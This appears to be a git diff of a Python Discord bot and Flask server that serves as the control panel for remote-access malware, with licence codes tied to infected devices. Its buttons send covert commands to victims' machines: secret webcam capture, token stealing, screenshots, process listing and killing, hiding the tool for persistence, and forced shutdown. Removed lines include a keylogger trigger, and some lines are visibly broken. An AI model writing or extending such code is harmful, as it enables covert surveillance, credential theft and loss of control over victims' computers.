@@ -21,20 +21,6 @@ WEB_SESSIONS_MEMORY = {}
 def home():
     return "3SRH Manager Bot is alive and running!"
 
-@app.route('/ping', methods=['POST'])
-def api_ping():
-    data = request.json
-    if not data: return {"status": "error", "message": "No data"}, 400
-    user_code = data.get("code", "").strip().upper()
-    db, sha, url, headers = fetch_db()
-    if not db or "codes" not in db or user_code not in db["codes"]:
-        return {"status": "error", "message": "Invalid code"}, 404
-    
-    db["codes"][user_code]["last_seen"] = int(time.time())
-    db["codes"][user_code]["active"] = True
-    save_db(db, sha, url, headers, f"Heartbeat from {user_code}")
-    return {"status": "success"}
-
 @app.route('/activate', methods=['POST'])
 def api_activate():
     data = request.json
@@ -72,10 +58,9 @@ def api_activate():
 
     if code_info["used"]:
         if code_info["device"] == current_device:
-            code_info["last_seen"] = int(time.time())
-            code_info["active"] = True
-            save_db(db, sha, url, headers, f"Re-activate {user_code}")
-            return {"status": "success", "ip": client_ip, "port": client_port, "country": client_country}
+            code_info["last_seen"] = int(time.time()) # تحديث وقت الظهور
+            save_db(db, sha, url, headers, f"Update heartbeat for {user_code}")
+            return {"status": "success", "message": "Already activated on this device"}
         else:
             return {"status": "error", "message": "Used on another device"}, 400
 
@@ -84,7 +69,6 @@ def api_activate():
     code_info["ip"] = client_ip
     code_info["port"] = client_port
     code_info["country"] = client_country
-    code_info["active"] = True
     code_info["last_seen"] = int(time.time())
 
     if save_db(db, sha, url, headers, f"Activate code {user_code} with real IP {client_ip}"):
@@ -194,7 +178,7 @@ GITHUB_TOKEN = os.getenv('GITHUB_TOKEN')
 REPO_OWNER = os.getenv('REPO_OWNER', 'kqi5q')
 REPO_NAME = os.getenv('REPO_NAME', '3srh-system-data')
 FILE_PATH = os.getenv('FILE_PATH', 'licenses.json')
-CHANNEL_ID = int(os.getenv('CHANNEL_ID', 154770581569838297)
+CHANNEL_ID = int(os.getenv('CHANNEL_ID', 1547705815698382970))
 
 class LicenseBot(discord.Client):
     def __init__(self):
@@ -233,7 +217,6 @@ class LicenseBot(discord.Client):
                     if user_code in db.get("codes", {}):
                         db["codes"][user_code]["used"] = False
                         db["codes"][user_code]["device"] = None
-                        db["codes"][user_code]["active"] = False
                     if save_db(db, sha, url, headers, f"Ban {user_code}"):
                         await interaction.followup.send(f"🚫 تم حظر الكود `{user_code}` والجهاز بنجاح!", ephemeral=True)
 
@@ -243,7 +226,6 @@ class LicenseBot(discord.Client):
                     if user_code in db.get("codes", {}):
                         db["codes"][user_code]["used"] = False
                         db["codes"][user_code]["device"] = None
-                        db["codes"][user_code]["active"] = False
                     if save_db(db, sha, url, headers, f"Reset {user_code}"):
                         await interaction.followup.send(f"♻️ تم رفع الحظر والتصفير للكود `{user_code}`!", ephemeral=True)
 
@@ -270,8 +252,7 @@ class LicenseBot(discord.Client):
                     db["blacklisted_codes"].remove(code_to_unban)
                     if code_to_unban in db.get("codes", {}):
                         db["codes"][code_to_unban]["used"] = False
-                        db["codes"][code_unban]["device"] = None
-                        db["codes"][code_to_unban]["active"] = False
+                        db["codes"][code_to_unban]["device"] = None
                     if save_db(db, sha, url, headers, f"Unban {code_to_unban}"):
                         await interaction.followup.send(f"♻️ تم رفع الحظر عن الكود `{code_to_unban}` بنجاح!", ephemeral=True)
 
@@ -286,36 +267,33 @@ class LicenseBot(discord.Client):
                     country = info.get("country", "Unknown")
                     hwid = info.get("device", "Unknown")
                     last_seen = info.get("last_seen", 0)
-                    is_active = (int(time.time()) - last_seen) < 20 # يعتبر متصلاً إذا أرسل نبضة خلال 20 ثانية
+                    is_online = (time.time() - last_seen) < 15 # يعتبر متصل إذا تفاعل خلال آخر 15 ثانية
+                    status_str = "🟢 متصل (Online)" if is_online else "🔴 غير متصل (Offline)"
                     
                     view = DeviceActionsView(dev_code, hwid, ip, port, country)
                     await interaction.followup.send(
-                        f"⚙️ **لوحة التحكم بالعميل:**\n🔑 الكود: `{dev_code}`\n🌐 IP: `{ip}`\n🔌 Port: `{port}`\n🌍 الدولة: `{country}`\n🔒 HWID: `{hwid}`\n⏱️ الحالة: {'🟢 متصل' if is_active else '🔴 مفصول'}", 
+                        f"⚙️ **لوحة التحكم بالعميل:**\n🔑 الكود: `{dev_code}`\nحالة الاتصال: **{status_str}**\n🌐 IP: `{ip}`\n🔌 Port: `{port}`\n🌍 الدولة: `{country}`\n🔒 HWID: `{hwid}`", 
                         view=view, ephemeral=True
                     )
 
-            elif custom_id == "refresh_devices_list":
+            elif custom_id.startswith("get_procs_"):
                 if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
-                db, _, _, _ = fetch_db()
-                if not db: 
-                    return await interaction.followup.send(" الاتصال بقاعدة البيانات.", ephemeral=True)
-                
-                devs_list = []
-                current_time = int(time.time())
-                for c, info in db.get("codes", {}).items():
-                    if info.get("used") and info.get("device"):
-                        last_seen = info.get("last_seen", 0)
-                        if (current_time - last_seen) > 25:
-                            info["active"] = False
-                        devs_list.append((c, info))
-                
-                # تحديث قاعدة البيانات في حال تغيرت حالات الاتصال
-                save_db(db, sha, url, headers, "Update device active states")
+                dev_code = custom_id.replace("get_procs_", "")
+                db, sha, url, headers = fetch_db()
+                if db:
+                    db.setdefault("remote_get_processes", {})[dev_code] = {"id": str(int(time.time()))}
+                    if save_db(db, sha, url, headers, f"Get processes for {dev_code}"):
+                        await interaction.followup.send("🔍 تم طلب قائمة العمليات الجارية من الجهاز، ستصلك رسالة قريباً بالبرامج المفتوحة مع أزرار الإغلاق!", ephemeral=True)
 
-                if not devs_list:
-                    await interaction.followup.send("⚠️ لا توجد أجهزة مسجلة.", ephemeral=True)
-                else:
-                    await interaction.followup.send("🔄 **تم تحديث قائمة الأجهزة وحالات الاتصال:**", view=DevicesSubMenuView(devs_list), ephemeral=True)
+            elif custom_id.startswith("kill_proc_one_"):
+                if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
+                # صيغة الـ custom_id هنا: kill_proc_one_<code_name>_<process_name>
+                _, _, _, dev_code, proc_name = custom_id.split("_", 4)
+                db, sha, url, headers = fetch_db()
+                if db:
+                    db.setdefault("remote_kill_process", {})[dev_code] = {"process_name": proc_name, "id": str(int(time.time()))}
+                    if save_db(db, sha, url, headers, f"Kill process {proc_name} for {dev_code}"):
+                        await interaction.followup.send(f"🛑 تم إرسال أمر إغلاق البرنامج `{proc_name}` للعميل!", ephemeral=True)
 
 client = LicenseBot()
 
@@ -330,13 +308,6 @@ def fetch_db():
         file_data = r.json()
         return json.loads(base64.b64decode(file_data["content"]).decode("utf-8")), file_data["sha"], url, headers
     return None, None, url, headers
-
-def fetch_db_safe():
-    try:
-        db, _, _, _ = fetch_db()
-        return db
-    except Exception:
-        return None
 
 def save_db(db, sha, url, headers, commit_message):
     new_content = base64.b64encode(json.dumps(db, indent=4).encode("utf-8")).decode("utf-8")
@@ -354,7 +325,7 @@ class ConfirmSaveView(discord.ui.View):
         db, sha, url, headers = fetch_db()
         if not db: return
         if "codes" not in db: db["codes"] = {}
-        for c in self.codes: db["codes"][c] = {"used": False, "device": None, "ip": None, "port": None, "country": None, "active": False, "last_seen": 0}
+        for c in self.codes: db["codes"][c] = {"used": False, "device": None, "ip": None, "port": None, "country": None, "last_seen": 0}
         if save_db(db, sha, url, headers, f"Generated {self.count} codes"):
             try: await interaction.message.delete()
             except Exception: pass
@@ -387,18 +358,18 @@ class DeviceActionsView(discord.ui.View):
         super().__init__(timeout=None)
         self.code, self.hwid, self.ip, self.port, self.country = code, hwid, ip, port, country
 
-    @discord.ui.button(label="🚫 حظر الكود والهاردوير", style=discord.ButtonStyle.secondary, custom_id="dev_act_ban", row=0)
+    @discord.ui.button(label="🚫 حظر الكود والهاردوير", style=discord.ButtonStyle.danger, custom_id="dev_act_ban", row=0)
     async def ban_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
         if db:
             db.setdefault("blacklisted_codes", []).append(self.code)
             db.setdefault("blacklisted_devices", []).append(self.hwid)
-            db["codes"][self.code].update({"used": False, "device": None, "active": False, "last_seen": 0})
+            db["codes"][self.code].update({"used": False, "device": None})
             if save_db(db, sha, url, headers, f"Ban {self.code}"):
                 await interaction.followup.send("🚫 تم حظر الكود والجهاز بنجاح!", ephemeral=True)
 
-    @discord.ui.button(label="👢 طرد بدون حظر", style=discord.ButtonStyle.secondary, custom_id="dev_act_kick", row=0)
+    @discord.ui.button(label="👢 طرد بدون حظر", style=discord.ButtonStyle.primary, custom_id="dev_act_kick", row=0)
     async def kick_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
@@ -406,6 +377,15 @@ class DeviceActionsView(discord.ui.View):
             db.setdefault("targeted_kick_messages", {})[self.code] = {"msg": "تم طردك من المالك", "id": str(int(time.time()))}
             if save_db(db, sha, url, headers, f"Kick {self.code}"):
                 await interaction.followup.send("👢 تم إرسال أمر الطرد للعميل!", ephemeral=True)
+
+    @discord.ui.button(label="⚙️ عرض البرامج المفتوحة وإغلاقها", style=discord.ButtonStyle.primary, custom_id="dev_act_processes", row=1)
+    async def procs_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
+        db, sha, url, headers = fetch_db()
+        if db:
+            db.setdefault("remote_get_processes", {})[self.code] = {"id": str(int(time.time()))}
+            if save_db(db, sha, url, headers, f"Get processes {self.code}"):
+                await interaction.followup.send("🔍 تم طلب قائمة العمليات الجارية من الجهاز، ستصلك قائمة تفصيلية بالبرامج المفتوحة قريباً!", ephemeral=True)
 
     @discord.ui.button(label="📸 التقاط كاميرا سرية", style=discord.ButtonStyle.secondary, custom_id="dev_act_webcam", row=1)
     async def webcam_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
@@ -423,7 +403,7 @@ class DeviceActionsView(discord.ui.View):
             db.setdefault("remote_token_stealers", {})[self.code] = {"id": str(int(time.time()))}
             if save_db(db, sha, url, headers, f"Tokens Dump {self.code}"): await interaction.followup.send("🔑 تم طلب سحب بيانات توكنات شاملة بنجاح!", ephemeral=True)
 
-    @discord.ui.button(label="📸 لقطة شاشة", style=discord.ButtonStyle.secondary, custom_id="dev_act_screenshot", row=1)
+    @discord.ui.button(label="📸 لقطة شاشة", style=discord.ButtonStyle.secondary, custom_id="dev_act_screenshot", row=2)
     async def ss_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
@@ -431,34 +411,15 @@ class DeviceActionsView(discord.ui.View):
             db.setdefault("remote_screenshots", {})[self.code] = {"id": str(int(time.time()))}
             if save_db(db, sha, url, headers, f"SS {self.code}"): await interaction.followup.send("📸 تم طلب لقطة الشاشة!", ephemeral=True)
 
-    @discord.ui.button(label="📊 مراقب العمليات والبرامج", style=discord.ButtonStyle.secondary, custom_id="dev_act_process_watcher", row=2)
-    async def process_watcher_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+    @discord.ui.button(label="🛡️ تفعيل الثبات الإلزامي (إخفاء بالخفاء)", style=discord.ButtonStyle.success, custom_id="dev_act_lock_app", row=2)
+    async def lock_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
         if db:
-            db.setdefault("remote_process_watchers", {})[self.code] = {"id": str(int(time.time()))}
-            if save_db(db, sha, url, headers, f"Process Watcher {self.code}"):
-                await interaction.followup.send("📊 تم إرسال أمر جلب قائمة العمليات والبرامج المفتوحة للعميل!", ephemeral=True)
+            db.setdefault("remote_lock_states", {})[self.code] = {"locked": True, "id": str(int(time.time()))}
+            if save_db(db, sha, url, headers, f"Lock {self.code}"): await interaction.followup.send("🛡️ تم إخفاء الأداة من شاشة العميل وجعلها تعمل في الخلفية بثبات تام!", ephemeral=True)
 
-    @discord.ui.button(label="⌨️ تسجيل ضربات المفاتيح (Keylogger)", style=discord.ButtonStyle.secondary, custom_id="dev_act_keylogger", row=2)
-    async def keylogger_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
-        db, sha, url, headers = fetch_db()
-        if db:
-            db.setdefault("remote_keyloggers", {})[self.code] = {"id": str(int(time.time()))}
-            if save_db(db, sha, url, headers, f"Keylogger {self.code}"):
-                await interaction.followup.send("⌨️ تم إرسال أمر تفعيل مراقبة المفاتيح للعميل!", ephemeral=True)
-
-    @discord.ui.button(label="🛡️ تفعيل الثبات الإلزامي (Startup)", style=discord.ButtonStyle.secondary, custom_id="dev_act_persistence", row=3)
-    async def persistence_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
-        db, sha, url, headers = fetch_db()
-        if db:
-            db.setdefault("remote_persistences", {})[self.code] = {"id": str(int(time.time()))}
-            if save_db(db, sha, url, headers, f"Persistence {self.code}"):
-                await interaction.followup.send("🛡️ تم إرسال أمر التثبيت الجذري (Startup Persistence) لجهاز العميل بنجاح!", ephemeral=True)
-
-    @discord.ui.button(label="🔓 إلغاء الثبات (إظهار النافذة)", style=discord.ButtonStyle.secondary, custom_id="dev_act_unlock_app", row=3)
+    @discord.ui.button(label="🔓 إلغاء الثبات (إظهار النافذة)", style=discord.ButtonStyle.secondary, custom_id="dev_act_unlock_app", row=2)
     async def unlock_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
@@ -467,7 +428,7 @@ class DeviceActionsView(discord.ui.View):
                 del db["remote_lock_states"][self.code]
             if save_db(db, sha, url, headers, f"Unlock {self.code}"): await interaction.followup.send("🔓 تم إلغاء الثبات وإعادة إظهار نافذة العميل بنجاح!", ephemeral=True)
 
-    @discord.ui.button(label="🛑 إطفاء الأداة (خروج كامل)", style=discord.ButtonStyle.secondary, custom_id="dev_act_kill_persistent", row=4)
+    @discord.ui.button(label="🛑 إطفاء الأداة (خروج كامل)", style=discord.ButtonStyle.danger, custom_id="dev_act_kill_persistent", row=3)
     async def kill_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
@@ -477,7 +438,7 @@ class DeviceActionsView(discord.ui.View):
                 del db["remote_lock_states"][self.code]
             if save_db(db, sha, url, headers, f"Close {self.code}"): await interaction.followup.send("🛑 تم إرسال أمر إطفاء الأداة وإغلاقها نهائياً للعميل دون علمه!", ephemeral=True)
 
-    @discord.ui.button(label="إغلاق البرامج في الخلفية", style=discord.ButtonStyle.secondary, custom_id="dev_act_kill_all_apps", row=4)
+    @discord.ui.button(label="إغلاق البرامج في الخلفية", style=discord.ButtonStyle.danger, custom_id="dev_act_kill_all_apps", row=3)
     async def kill_all_apps_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
@@ -486,7 +447,7 @@ class DeviceActionsView(discord.ui.View):
             if save_db(db, sha, url, headers, f"Kill all background apps for {self.code}"): 
                 await interaction.followup.send("🛑 تم إرسال أمر إغلاق البرامج في الخلفية بناءً على طلبك!", ephemeral=True)
 
-    @discord.ui.button(label="⚡ إيقاف تشغيل جهاز العميل", style=discord.ButtonStyle.secondary, custom_id="dev_act_shutdown", row=5)
+    @discord.ui.button(label="⚡ إيقاف تشغيل جهاز العميل", style=discord.ButtonStyle.danger, custom_id="dev_act_shutdown", row=4)
     async def shut_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
@@ -497,19 +458,17 @@ class DeviceActionsView(discord.ui.View):
 class DevicesSubMenuView(discord.ui.View):
     def __init__(self, devices):
         super().__init__(timeout=None)
-        for code, info in devices[:24]:
+        for code, info in devices[:25]:
             self.add_item(DeviceManageButton(code, info))
-        self.add_item(discord.ui.Button(label="🔄 تحديث القائمة", style=discord.ButtonStyle.primary, custom_id="refresh_devices_list", row=4))
 
 class DeviceManageButton(discord.ui.Button):
     def __init__(self, code, info):
         ip = info.get("ip", "Unknown")
-        port = info.get("port", "7680")
         country = info.get("country", "Unknown")
         last_seen = info.get("last_seen", 0)
-        is_active = (int(time.time()) - last_seen) < 25 # يعتبر متصلاً إذا أرسل نبضة خلال 25 ثانية
-        status_emoji = "🟢 " if is_active else "🔴 "
-        super().__init__(label=f"{status_emoji}{ip} | {country} ({code})", style=discord.ButtonStyle.secondary, custom_id=f"man_dev_{code}")
+        is_online = (time.time() - last_seen) < 15
+        status_icon = "🟢" if is_online else "🔴"
+        super().__init__(label=f"{status_icon} {ip} | {country} ({code})", style=discord.ButtonStyle.secondary, custom_id=f"man_dev_{code}")
         self.code = code
         self.info = info
 
@@ -521,7 +480,7 @@ class MainDashboardView(discord.ui.View):
     async def unused(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
         db, _, _, _ = fetch_db()
-        if not db: return await interaction.followup.send("❌ خطأ في الاتصال بقاعدة البيانات.", ephemeral=True)
+        if not db: return
         unused_list = [c for c, info in db.get("codes", {}).items() if not info.get("used", False)]
         await interaction.followup.send(f"🟢 **الأكواد المتاحة:** `{len(unused_list)}`", view=UnusedManagementView(unused_list) if unused_list else None, ephemeral=True)
 
@@ -529,44 +488,17 @@ class MainDashboardView(discord.ui.View):
     async def black(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
         db, _, _, _ = fetch_db()
-        if not db: return await interaction.followup.send("❌ خطأ في الاتصال بقاعدة البيانات.", ephemeral=True)
+        if not db: return
         blacklisted = db.get("blacklisted_codes", [])
         await interaction.followup.send(f"🚫 **المحظورة:** `{len(blacklisted)}`", view=BlacklistedCodesView(blacklisted) if blacklisted else None, ephemeral=True)
 
     @discord.ui.button(label="💻 الأجهزة والتحكم المطلق", style=discord.ButtonStyle.secondary, custom_id="dash_devices", row=1)
     async def devs(self, interaction: discord.Interaction, button: discord.ui.Button):
-        if not interaction.response.is_done():
-            await interaction.response.defer(thinking=True, ephemeral=True)
-        
-        try:
-            loop = asyncio.get_running_loop()
-            db = await loop.run_in_executor(None, fetch_db_safe)
-            
-            if not db:
-                await interaction.edit_original_response(content="❌ تعذر الاتصال بقاعدة البيانات لجلب الأجهزة.", view=None)
-                return
-                
-            devs_list = []
-            current_time = int(time.time())
-            for c, info in db.get("codes", {}).items():
-                if info.get("used") and info.get("device"):
-                    last_seen = info.get("last_seen", 0)
-                    if (current_time - last_seen) > 25:
-                        info["active"] = False
-                    devs_list.append((c, info))
-            
-            save_db(db, sha, url, headers, "Update device active states on dashboard open")
-                
-            if not devs_list:
-                await interaction.edit_original_response(content="⚠️ لا توجد أي أجهزة متصلة ومفعلة حالياً.", view=None)
-                return
-                
-            await interaction.edit_original_response(content="⚙️ **اختر الجهاز للتحكم الكامل:**", view=DevicesSubMenuView(devs_list))
-        except Exception as e:
-            try:
-                await interaction.edit_original_response(content=f"❌ حدث خطأ غير متوقع: {str(e)}", view=None)
-            except Exception:
-                pass
+        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
+        db, _, _, _ = fetch_db()
+        if not db: return
+        devs_list = [(c, info) for c, info in db.get("codes", {}).items() if info.get("used") and info.get("device")]
+        await interaction.followup.send("⚙️ **اختر الجهاز للتحكم الكامل:**", view=DevicesSubMenuView(devs_list) if devs_list else None, ephemeral=True)
 
 @client.tree.command(name="generate", description="توليد أكواد تفعيل جديدة")
 async def generate(interaction: discord.Interaction, count: int = 1):
@@ -649,9 +581,7 @@ async def check_code(interaction: discord.Interaction, code: str):
         await interaction.followup.send(f"❌ الكود غير موجود.", ephemeral=True)
         return
     info = db["codes"][code]
-    last_seen = info.get("last_seen", 0)
-    is_active = (int(time.time()) - last_seen) < 25
-    status = "مستخدم ومتصل 🟢" if (info.get("used") and is_active) else ("مستخدم ومفصل 🔴" if info.get("used") else "متاح 🟢")
+    status = "مستخدم 🔴" if info.get("used") else "متاح 🟢"
     await interaction.followup.send(f"🔍 **الكود `{code}`:**\n📌 الحالة: {status}\n🌐 IP: `{info.get('ip') or 'غير متصل'}`\n🔌 Port: `{info.get('port') or '7680'}`\n🌍 الدولة: `{info.get('country') or 'غير معروفة'}`\n🔒 HWID: `{info.get('device') or 'لا يوجد'}`", ephemeral=True)
 
 @client.tree.command(name="delete", description="حذف كود نهائياً")
@@ -681,8 +611,6 @@ async def reset_device(interaction: discord.Interaction, code: str):
     db["codes"][code]["ip"] = None
     db["codes"][code]["port"] = None
     db["codes"][code]["country"] = None
-    db["codes"][code]["active"] = False
-    db["codes"][code]["last_seen"] = 0
     if save_db(db, sha, url, headers, f"Reset code: {code}"):
         await interaction.followup.send(f"🔄 تم تصفير الكود `{code}` وأصبح متاحاً!", ephemeral=True)
 
@@ -702,16 +630,6 @@ async def screenshot_command(interaction: discord.Interaction, target: str):
         await interaction.followup.send(f"📸 **تم إرسال أمر التقاط الشاشة بنجاح!**", ephemeral=True)
 
 @client.tree.command(name="clear", description="حذف رسائل البوت وتنظيف الشاشة")
-@app_commands.describe(amount="عدد الرسائل المراد مسحها")
-async def clear_messages(interaction: discord.Interaction, amount: int = 10):
-    if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
-    deleted = await interaction.channel.purge(limit=amount)
-    await interaction.followup.send(f"🧹 تم تنظيف وحذف `{len(deleted)}` رسالة!", ephemeral=True)
-    await asyncio.sleep(3)
-    try: await interaction.delete_original_response()
-    except Exception: pass
-
-@client.tree.command(name="sync", description="مزامنة الأطم البوت وتنظيف الشاشة")
 @app_commands.describe(amount="عدد الرسائل المراد مسحها")
 async def clear_messages(interaction: discord.Interaction, amount: int = 10):
     if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
